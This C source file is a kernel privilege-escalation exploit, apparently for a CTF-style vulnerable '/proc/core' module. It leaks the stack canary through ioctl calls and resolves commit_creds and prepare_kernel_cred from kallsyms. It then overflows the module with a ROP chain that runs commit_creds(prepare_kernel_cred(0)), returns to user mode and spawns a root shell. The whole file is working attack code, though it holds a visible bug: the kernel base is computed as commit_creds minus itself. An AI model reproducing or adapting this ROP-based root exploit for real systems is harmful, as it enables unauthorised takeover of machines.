// gcc exp.c -o exp --static -masm=intel -g
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/ioctl.h>

size_t commit_creds = NULL, prepare_kernel_cred = NULL;        // address of to key function
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RDI_RET 0xffffffff81000b2f  
#define POP_RCX_RET 0xffffffff81021e53
#define IRETQ 0xffffffff81050ac2 
size_t user_cs, user_ss,user_rflags,user_sp;

//int fd = 0;        // file pointer of process 'core'

/*void saveStatus();
void get_function_address();
#void core_read(int fd, char* buf);
void change_off(int fd, long long off);
void core_copy_func(int fd, long long nbytes);
void print_binary(char* buf, int length);
void shell();
*/
void saveStatus(){
  __asm__("mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          );
  puts("\033[34m\033[1m Status has been saved . \033[0m");
}

void core_read(int fd, char *addr){
  printf("try read\n");
  ioctl(fd,0x6677889B,addr);
  printf("read done!");
}

void change_off(int fd, long long off){
  printf("try set off \n");
  ioctl(fd,0x6677889C,off);
}

void core_copy_func(int fd, long long nbytes){
  puts("try cp\n");
  ioctl(fd,0x6677889A,nbytes);
}

void get_function_address(){
        FILE* sym_table = fopen("/tmp/kallsyms", "r");        // including all address of kernel functions,just like the user model running address.
        if(sym_table == NULL){
                printf("\033[31m\033[1m[x] Error: Cannot open file \"/tmp/kallsyms\"\n\033[0m");
                exit(1);
        }
        size_t addr = 0;
        char type[0x10];
        char func_name[0x50];
        // when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.
        while(fscanf(sym_table, "%llx%s%s", &addr, type, func_name)){
                if(commit_creds && prepare_kernel_cred)                // two addresses of key functions are all found, return directly.
                        return;
                if(!strcmp(func_name, "commit_creds")){                // function "commit_creds" found
                        commit_creds = addr;
                        printf("\033[32m\033[1m[+] Note: Address of function \"commit_creds\" found: \033[0m%#llx\n", commit_creds);
                }else if(!strcmp(func_name, "prepare_kernel_cred")){
                        prepare_kernel_cred = addr;
                        printf("\033[32m\033[1m[+] Note: Address of function \"prepare_kernel_cred\" found: \033[0m%#llx\n", prepare_kernel_cred);
                }
        }
}


void shell(){
        if(getuid()){
                printf("\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m");
                exit(1);
        }
        printf("\033[32m\033[1m[+] Getting the root......\033[0m\n");
        system("/bin/sh");
        exit(0);
}

int main(){
  saveStatus();
  int fd = open("/proc/core",2);              //get the process fd
  if(!fd){
                printf("\033[31m\033[1m[x] Error: Cannot open process \"core\"\n\033[0m");
                exit(1);
        }
  char buffer[0x100] = {0};
        get_function_address();                // get addresses of two key function
  ssize_t vmlinux = commit_creds - commit_creds;            //base address
  printf("vmlinux_base = %x",vmlinux);
  //get canary 
  size_t canary;
  change_off(fd,0x40);
  //getchar();
  
  core_read(fd,buffer);
  canary = ((size_t *)buffer)[0];
  printf("canary ==> %p\n",canary);
  //build the ROP
  size_t rop_chain[0x1000] ,i= 0;
  printf("construct the chain\n");
  for(i=0; i< 10 ;i++){
    rop_chain[i] = canary;
  }
  rop_chain[i++] = POP_RDI_RET + vmlinux ; 
  rop_chain[i++] = 0;
  rop_chain[i++] = prepare_kernel_cred ;          //prepare_kernel_cred(0)
  rop_chain[i++] = POP_RDX_RET + vmlinux;
  rop_chain[i++] = POP_RCX_RET + vmlinux;
  rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + vmlinux;
  rop_chain[i++] = commit_creds ;
  rop_chain[i++] = SWAPGS_POPFQ_RET + vmlinux;
  rop_chain[i++] = 0;
  rop_chain[i++] = IRETQ + vmlinux;
  rop_chain[i++] = (size_t)shell;
  rop_chain[i++] = user_cs;
  rop_chain[i++] = user_rflags;
  rop_chain[i++] = user_sp;
  rop_chain[i++] = user_ss;
  write(fd,rop_chain,0x800);
  core_copy_func(fd,0xffffffffffff0100); 
}
